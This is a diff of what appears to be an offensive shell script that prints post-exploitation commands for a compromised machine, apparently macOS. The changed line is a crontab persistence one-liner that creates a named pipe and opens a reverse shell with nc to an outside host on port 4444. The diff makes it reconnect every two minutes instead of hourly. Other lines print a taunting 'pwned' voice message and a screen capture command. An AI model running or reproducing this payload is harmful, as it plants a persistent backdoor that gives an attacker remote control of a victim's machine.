@@ -10,7 +10,7 @@ echo "[*] Greetings:"
 echo "say you have been pwned"
 echo ""
 echo "[*] crontab:"
-echo 'crontab -l | { cat; echo "2 * * * * nohup -- \"\$(rm -f /tmp/g; mkfifo /tmp/g; /bin/sh 0< /tmp/g | nc pipeter.asuscomm.com 4444 1> /tmp/g)\" &"; } | crontab -'
+echo 'crontab -l | { cat; echo "*/2 * * * * nohup -- \"\$(rm -f /tmp/g; mkfifo /tmp/g; /bin/sh 0< /tmp/g | nc pipeter.asuscomm.com 4444 1> /tmp/g)\" &"; } | crontab -'
 echo ""
 echo "[*] Screenshot"
 echo "screencapture asd.jpg"
